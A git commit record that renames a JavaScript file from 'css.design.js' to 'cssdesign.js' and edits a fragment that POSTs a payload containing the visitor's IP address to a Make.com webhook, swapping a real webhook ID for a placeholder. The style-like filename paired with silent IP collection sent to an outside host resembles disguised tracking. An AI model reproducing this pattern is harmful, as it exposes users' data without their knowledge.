df799c6fe4613f5e7171f57dfbae44a664adac75
SaCapitalManagement <setupalpha.capital@gmail.com>
2025-07-23 16:43:00 +0300

    Update and rename css.design.js to cssdesign.js

--- cssdesign.js
+++ cssdesign.js
@@ -15,9 +15,7 @@
       ip: ipData.ip || "not captured"
     };
 
-    console.log("Sending to Make:", payload);
-
-    await fetch("https://hook.eu2.make.com/vtiu18tyb2sinr3lnu7mu4eunfsop11i", {
+    await fetch("https://hook.eu2.make.com/YOUR-WEBHOOK-ID", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
